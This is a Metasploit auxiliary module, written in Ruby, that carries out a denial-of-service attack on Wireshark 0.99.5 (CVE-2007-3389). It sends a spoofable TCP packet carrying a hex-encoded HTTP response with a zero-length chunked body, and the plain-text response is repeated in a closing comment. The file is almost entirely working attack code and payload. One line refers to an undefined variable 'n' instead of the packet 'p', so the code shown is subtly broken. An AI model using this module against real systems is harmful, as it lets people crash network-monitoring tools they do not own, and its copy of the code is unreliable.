##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark chunked_encoding_dissector Function DOS',
      'Description'    => %q{
        Wireshark crash when dissecting an HTTP chunked response.
        Versions affected: 0.99.5 (Bug 1394)
      },
      'Author' 	=> [ 'Matteo Cantoni <goony[at]nothink.org>' ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'CVE', '2007-3389'],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=1394'],
        ],
      'DisclosureDate' => 'Feb 22 2007'))

    register_options([
      OptInt.new('SPORT', [true, 'The source port used to send the malicious HTTP response', 80]),
      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
    ], self.class)

    deregister_options('FILTER','PCAPFILE')
  end

  def run
    open_pcap

    print_status("Sending packet to #{rhost}")

    p = PacketFu::TCPPacket.new
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = dhost
    p.tcp_dport = rand(65535)+1
    n.tcp_ack = rand(0x100000000)
    p.tcp_flags.psh = 1
    p.tcp_flags.ack = 1
    p.tcp_sport = datastore['SPORT'].to_i
    p.tcp_window = 3072

    # The following hex blob contains an HTTP response with a chunked-encoding
    # length of 0. The ASCII version is below in a block comment.
    #
    # We represent it like this to prevent tools from mangling the carriage
    # returns within it.
    #
    p.payload = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x33\x30\x32\x20\x46\x6f\x75" +
      "\x6e\x64\x0d\x0a\x44\x61\x74\x65\x3a\x20\x54\x68\x75\x2c\x20\x32" +
      "\x32\x20\x46\x65\x62\x20\x32\x30\x30\x37\x20\x32\x31\x3a\x35\x39" +
      "\x3a\x30\x33\x20\x47\x4d\x54\x0d\x0a\x53\x65\x72\x76\x65\x72\x3a" +
      "\x20\x41\x70\x61\x63\x68\x65\x2f\x31\x2e\x33\x2e\x33\x37\x20\x28" +
      "\x55\x6e\x69\x78\x29\x20\x50\x48\x50\x2f\x34\x2e\x34\x2e\x34\x20" +
      "\x6d\x6f\x64\x5f\x74\x68\x72\x6f\x74\x74\x6c\x65\x2f\x33\x2e\x31" +
      "\x2e\x32\x20\x6d\x6f\x64\x5f\x70\x73\x6f\x66\x74\x5f\x74\x72\x61" +
      "\x66\x66\x69\x63\x2f\x30\x2e\x31\x20\x6d\x6f\x64\x5f\x73\x73\x6c" +
      "\x2f\x32\x2e\x38\x2e\x32\x38\x20\x4f\x70\x65\x6e\x53\x53\x4c\x2f" +
      "\x30\x2e\x39\x2e\x36\x62\x20\x46\x72\x6f\x6e\x74\x50\x61\x67\x65" +
      "\x2f\x35\x2e\x30\x2e\x32\x2e\x32\x36\x33\x35\x0d\x0a\x58\x2d\x50" +
      "\x6f\x77\x65\x72\x65\x64\x2d\x42\x79\x3a\x20\x50\x48\x50\x2f\x34" +
      "\x2e\x34\x2e\x34\x0d\x0a\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20" +
      "\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31" +
      "\x2f\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c\x0d\x0a\x50\x33\x50" +
      "\x3a\x20\x70\x6f\x6c\x69\x63\x79\x72\x65\x66\x3d\x22\x68\x74\x74" +
      "\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x77\x33" +
      "\x63\x2f\x70\x33\x70\x2e\x78\x6d\x6c\x22\x2c\x20\x43\x50\x3d\x22" +
      "\x4e\x4f\x49\x20\x44\x53\x50\x20\x43\x4f\x52\x20\x4e\x49\x44\x20" +
      "\x41\x44\x4d\x20\x44\x45\x56\x20\x50\x53\x41\x20\x4f\x55\x52\x20" +
      "\x49\x4e\x44\x20\x55\x4e\x49\x20\x50\x55\x52\x20\x43\x4f\x4d\x20" +
      "\x4e\x41\x56\x20\x49\x4e\x54\x20\x53\x54\x41\x22\x0d\x0a\x45\x78" +
      "\x70\x69\x72\x65\x73\x3a\x20\x54\x68\x75\x2c\x20\x31\x39\x20\x4e" +
      "\x6f\x76\x20\x31\x39\x38\x31\x20\x30\x38\x3a\x35\x32\x3a\x30\x30" +
      "\x20\x47\x4d\x54\x0d\x0a\x50\x72\x61\x67\x6d\x61\x3a\x20\x6e\x6f" +
      "\x2d\x63\x61\x63\x68\x65\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d" +
      "\x44\x69\x73\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x20\x61\x74\x74" +
      "\x61\x63\x68\x6d\x65\x6e\x74\x3b\x20\x66\x69\x6c\x65\x6e\x61\x6d" +
      "\x65\x3d\x53\x74\x61\x74\x43\x6f\x75\x6e\x74\x65\x72\x2d\x4c\x6f" +
      "\x67\x2d\x32\x32\x38\x37\x35\x39\x32\x2e\x63\x73\x76\x0d\x0a\x53" +
      "\x65\x74\x2d\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x50\x48\x50\x53\x45" +
      "\x53\x53\x49\x44\x3d\x64\x37\x35\x65\x64\x39\x37\x36\x66\x30\x30" +
      "\x39\x64\x61\x31\x31\x38\x65\x62\x36\x31\x34\x62\x39\x38\x66\x64" +
      "\x35\x62\x39\x31\x36\x25\x33\x42\x2b\x70\x61\x74\x68\x25\x33\x44" +
      "\x25\x32\x46\x0d\x0a\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x3a" +
      "\x20\x74\x69\x6d\x65\x6f\x75\x74\x3d\x31\x35\x2c\x20\x6d\x61\x78" +
      "\x3d\x31\x30\x30\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e" +
      "\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0d\x0a\x54\x72" +
      "\x61\x6e\x73\x66\x65\x72\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a" +
      "\x20\x63\x68\x75\x6e\x6b\x65\x64\x0d\x0a\x43\x6f\x6e\x74\x65\x6e" +
      "\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74" +
      "\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d" +
      "\x0d\x0a\x0d\x0a\x30\x0d\x0a\x0d\x0a"

    p.recalc
    capture_sendto(p, rhost)

    close_pcap
  end
end

=begin
HTTP/1.1 302 Found
Date: Thu, 22 Feb 2007 21:59:03 GMT
Server: Apache/1.3.37 (Unix) PHP/4.4.4 mod_throttle/3.1.2 mod_psoft_traffic/0.1 mod_ssl/2.8.28 OpenSSL/0.9.6b FrontPage/5.0.2.2635
X-Powered-By: PHP/4.4.4
Location: http://127.0.0.1/index.html
P3P: policyref="http://127.0.0.1/w3c/p3p.xml", CP="NOI DSP COR NID ADM DEV PSA OUR IND UNI PUR COM NAV INT STA"
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Disposition: attachment; filename=StatCounter-Log-2287592.csv
Set-Cookie: PHPSESSID=d75ed976f009da118eb614b98fd5b916%3B+path%3D%2F
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/octet-stream

0
=end
